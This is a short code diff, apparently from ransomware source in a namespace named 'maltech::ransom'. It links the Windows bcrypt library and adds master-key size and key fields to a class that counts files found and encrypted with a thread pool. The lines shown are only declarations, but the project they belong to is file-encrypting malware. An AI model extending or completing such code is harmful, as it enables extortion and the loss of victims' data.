@@ -9,6 +9,8 @@
 #include <memory>
 #include <atomic>
 
+#pragma comment(lib, "bcrypt.lib")
+
 namespace maltech {
 
     namespace ransom {
@@ -26,7 +28,8 @@ namespace maltech {
             ThreadPool thread_pool_{ GetMaximumProcessorCount(ALL_PROCESSOR_GROUPS) };
             std::atomic<DWORD> files_count_ = 0;
             std::atomic<DWORD> crypted_count_ = 0;
-
+            const int key_ = 0;
+            const SIZE masterkey_size_{ 32 };
             UCHAR masterkey_[32];
 
 
